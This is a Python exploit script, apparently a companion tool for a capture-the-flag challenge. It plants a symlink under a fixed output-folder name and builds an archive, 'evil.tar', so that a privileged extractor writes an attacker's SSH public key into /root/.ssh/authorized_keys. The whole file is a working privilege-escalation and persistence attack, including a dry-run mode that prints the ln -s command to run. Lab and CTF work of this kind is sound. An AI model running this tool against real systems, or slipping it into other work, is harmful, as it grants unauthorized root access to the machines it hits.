#!/usr/bin/env python3
"""Build a tar that writes a payload file through a pre-planted output-dir symlink.

Companion tool for CTFTTE-PWN-009 / CTFTCTE-PWN-009 (fixed-name output symlink
redirect). A privileged extractor that writes to a hard-coded relative folder
(e.g. ./extracted) follows a symlink planted under that exact name, so an
archive entry named `authorized_keys` lands in /root/.ssh.

Usage:
  tar-symlink-redirect.py --target /root/.ssh --payload-file id_ed25519.pub
  tar-symlink-redirect.py --target /root/.ssh --payload-file key.pub \
      --link-name extracted --payload-name authorized_keys --output evil.tar --no-link

Modes:
  default      create the symlink in the current directory and write the archive
  --dry-run    print the equivalent shell commands, change nothing
  --no-link    only write the archive (symlink already in place)

The script never contacts the network and never writes outside the current
directory.
"""
from __future__ import annotations

import argparse
import io
import os
import sys
import tarfile
from pathlib import Path


def build_archive(output: Path, payload: bytes, payload_name: str) -> None:
    info = tarfile.TarInfo(name=payload_name)
    info.size = len(payload)
    info.mode = 0o600
    with tarfile.open(output, "w") as tf:
        tf.addfile(info, fileobj=io.BytesIO(payload))


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", required=True,
                    help="absolute directory the symlink points at (e.g. /root/.ssh)")
    ap.add_argument("--payload-file", required=True,
                    help="file whose contents become the archive entry")
    ap.add_argument("--payload-name", default="authorized_keys",
                    help="entry name inside the archive (default: authorized_keys)")
    ap.add_argument("--link-name", default="extracted",
                    help="fixed output-folder name the tool writes to (default: extracted)")
    ap.add_argument("--output", default="evil.tar", help="archive path (default: evil.tar)")
    ap.add_argument("--no-link", action="store_true",
                    help="do not create the symlink, only build the archive")
    ap.add_argument("--dry-run", action="store_true",
                    help="print commands instead of acting")
    args = ap.parse_args()

    if not os.path.isabs(args.target.replace("\\", "/")) and not args.dry_run:
        print("warning: --target does not look absolute; the redirect may land elsewhere",
              file=sys.stderr)

    payload = Path(args.payload_file).read_bytes()

    if args.dry_run:
        print(f"ln -s {args.target} {args.link_name}")
        print(f"# then run the privileged extractor here so it writes into {args.target}")
        print(f"# archive entry: {args.payload_name} ({len(payload)} bytes)")
        return 0

    if not args.no_link:
        link = Path(args.link_name)
        if link.is_symlink():
            print(f"symlink {link} already exists -> {os.readlink(link)}")
        else:
            try:
                os.symlink(args.target, link)
                print(f"planted symlink: {link} -> {args.target}")
            except (OSError, NotImplementedError) as exc:
                print(f"could not create symlink ({exc}); run as root on the target box:",
                      file=sys.stderr)
                print(f"  ln -s {args.target} {args.link_name}", file=sys.stderr)
                return 2

    build_archive(Path(args.output), payload, args.payload_name)
    print(f"wrote {args.output}: entry '{args.payload_name}' -> "
          f"{args.link_name}/{args.payload_name}")
    print(f"after the privileged extract, check: {args.target}/{args.payload_name}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
